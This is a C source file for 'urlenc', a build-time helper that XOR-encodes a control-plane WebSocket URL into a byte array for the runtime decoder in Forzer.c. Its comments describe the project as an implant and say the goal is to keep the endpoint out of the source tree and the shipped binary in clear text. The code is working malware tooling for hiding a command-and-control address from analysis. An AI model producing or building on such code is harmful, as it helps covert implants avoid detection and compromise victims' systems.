/* urlenc — dev tool. Print the obfuscated byte array for a control-plane URL.

   The runtime decoder lives in Forzer.c and shares its keystream from
   urlkey.h, so the two cannot drift.

   Build:  gcc -O2 -o urlenc.exe urlenc.c
   Use:    urlenc.exe wss://host.example        -> copy the printed array
           urlenc.exe wss://host.example -d     -> decode (self-test)

   This is a build-time convenience, not part of the implant. The plaintext
   URL only ever passes through argv here; the array you paste is already
   obfuscated, so neither the source tree nor the shipped binary ever holds
   the endpoint in the clear. */

#include <stdio.h>
#include <string.h>
#include "urlkey.h"

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: urlenc <url> [-d]\n");
        return 2;
    }
    const char *url = argv[1];
    size_t n = strlen(url);
    if (n == 0) { fprintf(stderr, "error: empty url\n"); return 2; }

    unsigned char blob[512];
    if (n >= sizeof(blob)) { fprintf(stderr, "error: url too long\n"); return 2; }
    for (size_t i = 0; i < n; i++) blob[i] = (unsigned char)url[i] ^ url_ks((unsigned)i);

    if (argc >= 3 && !strcmp(argv[2], "-d")) {
        /* self-test: decode it straight back */
        for (size_t i = 0; i < n; i++) blob[i] ^= url_ks((unsigned)i);
        blob[n] = 0;
        printf("%s\n", (char *)blob);
        return strcmp((char *)blob, url) == 0 ? 0 : 1;
    }

    printf("static const unsigned char k_builtin_url_blob[] = {\n   ");
    for (size_t i = 0; i < n; i++) {
        printf(" 0x%02X,", blob[i]);
        if ((i + 1) % 12 == 0) printf("\n   ");
    }
    printf("\n};\n");
    return 0;
}
